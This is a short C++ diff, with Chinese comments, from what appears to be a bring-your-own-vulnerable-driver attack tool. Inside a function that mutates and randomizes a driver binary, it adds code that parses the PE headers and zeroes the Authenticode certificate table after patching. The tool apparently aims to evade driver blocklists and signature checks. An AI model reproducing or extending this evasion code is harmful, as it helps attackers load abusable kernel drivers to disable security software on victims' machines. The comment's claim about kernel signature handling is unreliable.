@@ -2504,6 +2504,22 @@ static BYOVDDriverInfo MutateAndRandomizeDriver(const BYOVDDriverInfo& original)
                     }
                 }
                 if (replaced > 0) {
+                    // BUILD 469: 剥离 PE 数字证书 — 补丁破坏了 Authenticode 哈希
+                    //   清零 Certificate Table 数据目录 → 内核跳过嵌入式签名验证
+                    if (fs >= 0x100 && patchBuf[0] == 'M' && patchBuf[1] == 'Z') {
+                        uint32_t peOff = *(uint32_t*)(patchBuf.data() + 0x3C);
+                        if (peOff + 4 <= fs && memcmp(patchBuf.data() + peOff, "PE\0\0", 4) == 0) {
+                            uint32_t ohOff = peOff + 24; // Optional Header
+                            if (ohOff + 2 <= fs) {
+                                uint16_t magic = *(uint16_t*)(patchBuf.data() + ohOff);
+                                uint32_t certOff = (magic == 0x20B) ? ohOff + 144 : ohOff + 128;
+                                if (certOff + 8 <= fs) {
+                                    *(uint64_t*)(patchBuf.data() + certOff) = 0; // zero entire data directory
+                                    ByovdDiag("BYOVD:Mutate: stripped PE cert table at +0x%X\n", certOff);
+                                }
+                            }
+                        }
+                    }
                     SetFilePointer(hPatch, 0, nullptr, FILE_BEGIN);
                     SetEndOfFile(hPatch);
                     DWORD wr = 0;
